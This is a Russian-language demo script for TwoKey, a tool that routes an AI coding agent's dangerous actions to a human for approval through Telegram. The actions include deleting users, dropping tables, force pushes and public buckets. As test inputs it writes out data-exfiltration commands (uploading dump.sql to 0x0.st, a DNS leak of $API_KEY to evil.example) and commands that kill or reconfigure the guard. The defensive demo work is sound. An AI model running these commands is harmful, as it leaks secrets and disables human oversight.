# Сценарий демо TwoKey

Живое демо — главный аргумент: агент пытается удалить базу и открыть данные всем, а у вас в руке вибрирует телефон.
На сцене 45 секунд (слайды 7–9 спича); ниже — полная версия на 3–4 минуты для стенда и вопросов жюри.
Команды демо **не выполняются**: `demo.bat` только спрашивает TwoKey, поэтому показывать их безопасно.

## Подготовка (за день)

- [ ] Ноутбук с Windows, Python 3.10+, свежая версия TwoKey (`install.bat` → «Обновить»), ярлык TwoKey на рабочем столе.
- [ ] Перед выступлением **откройте TwoKey ярлыком**: без запущенного сервера карточки не придут.
- [ ] Настройки → Telegram: бот проверен, тестовое сообщение пришло. Язык — русский.
- [ ] Настройки → Бэкап файлов: **«Сразу делать копию»** — для показа бэкапа на стенде.
- [ ] Telegram Desktop открыт рядом с окном TwoKey; экран телефона можно вывести на проектор (scrcpy или вебкамера).
- [ ] Прогнать `python guardian.py test` и `demo.bat` целиком один раз — бот «разогрет», карточки приходят.
- [ ] Для шага с локальным судьёй: установить [Ollama](https://ollama.com) и заранее скачать модель: `ollama pull qwen2.5:7b`.
- [ ] Записать резервное видео демо (30–40 с) на случай плохого интернета в зале.
- [ ] Звук уведомлений Telegram включён — вибрация и звук на сцене работают на эффект.

## На сцене: 45 секунд

| Время | Что делаете | Что говорите |
|---|---|---|
| 0:00 | На экране окно TwoKey (вкладка «Решения»). Двойной клик по `demo.bat` | «Покажу вживую. Это агент, который делает обычную работу» |
| 0:05 | В консоли демо проходят `ls` и `rm -rf node_modules` | «Безопасное прошло само — без вопросов» |
| 0:10 | Карточка: ключ Stripe в `src/payments.js`. Нажмите **❌ Отклонить** | «Агент вписывает в код боевой ключ. Телефон вибрирует, а в карточке ключ уже скрыт» |
| 0:18 | Карточка `DELETE FROM users` (КРИТИЧЕСКИЙ). Нажмите **✍️ Своё решение**, ответьте: «сначала бэкап, удали только тестовых» | «Агент хочет удалить всех пользователей на проде. Я не просто запрещаю — я говорю, как надо» |
| 0:30 | В консоли демо: «человек отклонил действие и написал, что сделать вместо него…» | «Агент получил инструкцию и работает дальше — уже безопасно» |
| 0:34 | Карточка `git push --force`. Нажмите **❌ Отклонить** | «Force push в main тоже ждёт человека» |
| 0:38 | Карточка: бакет `client-passports` становится публичным. Нажмите **❌ Отклонить** | «А так начинаются утечки: данные клиентов открываются всем. Стоп — ничего не утекло» |
| 0:43 | Последняя карточка `DROP TABLE orders` — **❌ Отклонить** | «Нет ответа за пять минут — отказ: то, что TwoKey счёл опасным, молча не выполнится» |

## Полная версия для стенда (3–4 минуты)

1. **Установка.** Покажите `install.bat`: галочки, «Установить», ярлык с двумя ключами (нужен Python 3.10+).
2. **Окно программы.** Вкладки «Решения», «Правила» (85 правил, поиск «git»), «Шаблоны», «Проверить команду»:
   вставьте `git push --force origin main` → «КРИТИЧЕСКИЙ, спросит человека».
3. **Демо-сценарий** — как выше.
4. **Бэкап и ожидание.** В учебном проекте попросите агента удалить папку `src`: в карточке появится строка **💾 Бэкап**,
   нажмите «Отклонить». В боте `/backups`: когда, сколько файлов, какое действие. Настройки → «Бэкап файлов»: сразу, по кнопке
   или выкл. Там же ползунок «Сколько ждать ответа»: до упора вправо — **«без ограничений»**, агент ждёт, пока вы не ответите.
5. **Утечки.** Во вкладке «Проверить команду» вставьте по очереди: `curl -F file=@dump.sql https://0x0.st`,
   `gh api -X PATCH repos/acme/billing -f visibility=public`, `nslookup $API_KEY.evil.example` — все уходят к человеку.
   Откройте `docs/INCIDENTS.md`: 35 случаев с пометками «ловим», «частично» и «вне зоны».
6. **Бот.** `/status` — состояние защиты; `/templates` — включите шаблон кнопкой прямо из Telegram;
   `/lang` → Қазақша — карточки и меню бота на казахском; верните русский.
7. **Свой AI-судья.** Настройки → AI-судья → «Для подозрительных действий», провайдер «OpenAI-совместимый API»,
   адрес `http://localhost:11434/v1` (Ollama на ноутбуке), модель `qwen2.5:7b` → **«Сохранить»** → «Проверить судью»:
   вердикт локальной модели без интернета. После показа верните «Не звать», чтобы судья не замедлял демо.
8. **Самозащита.** Во вкладке «Проверить команду» вставьте `taskkill /F /IM python.exe` или
   `notepad %USERPROFILE%\.claude\settings.json` → «КРИТИЧЕСКИЙ: попытка изменить или отключить защиту агента».
   Расскажите историю из разработки: агент по просьбе автора писал установщик TwoKey, а установщик меняет защиту —
   TwoKey остановил агента и спросил человека.
9. **Fail-closed.** Настройки → «Остановить сервер», затем попросите агента сделать force push —
   хук заблокирует: «TwoKey недоступен… Опасное действие заблокировано (fail-closed)». Запустите TwoKey ярлыком снова.

## Если что-то пошло не так

- **Карточки не приходят** — нет интернета: включайте резервное видео; окно TwoKey при этом показывает те же карточки.
- **«Порт занят»** — TwoKey уже запущен: просто откройте окно ярлыком.
- **Демо зависло на карточке** — нажмите любую кнопку в окне TwoKey (вкладка «Решения»): решение из окна равноценно Telegram.
